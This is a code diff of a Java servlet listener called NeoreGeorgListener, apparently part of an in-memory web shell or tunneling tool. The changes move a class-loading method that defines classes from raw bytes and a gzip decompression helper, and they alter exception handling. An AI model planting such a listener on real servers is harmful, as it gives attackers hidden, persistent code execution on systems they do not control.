@@ -33,36 +33,6 @@ public class NeoreGeorgListener extends ClassLoader implements ServletRequestLis
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-    @SuppressWarnings("all")
-    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        GZIPInputStream gzipInputStream = null;
-        try {
-            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
-            byte[] buffer = new byte[4096];
-            int n;
-            while ((n = gzipInputStream.read(buffer)) > 0) {
-                out.write(buffer, 0, n);
-            }
-            return out.toByteArray();
-        } finally {
-            if (gzipInputStream != null) {
-                gzipInputStream.close();
-            }
-            out.close();
-        }
-    }
-
-    @Override
-    public void requestDestroyed(ServletRequestEvent sre) {
-
-    }
-
     @Override
     @SuppressWarnings("all")
     public void requestInitialized(ServletRequestEvent sre) {
@@ -93,11 +63,42 @@ public class NeoreGeorgListener extends ClassLoader implements ServletRequestLis
                 }
                 namespace.get(chars).equals(args);
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
     }
 
     private Object getResponseFromRequest(Object request) throws Exception {
         return null;
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } finally {
+            if (gzipInputStream != null) {
+                gzipInputStream.close();
+            }
+            out.close();
+        }
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+
     }
 }
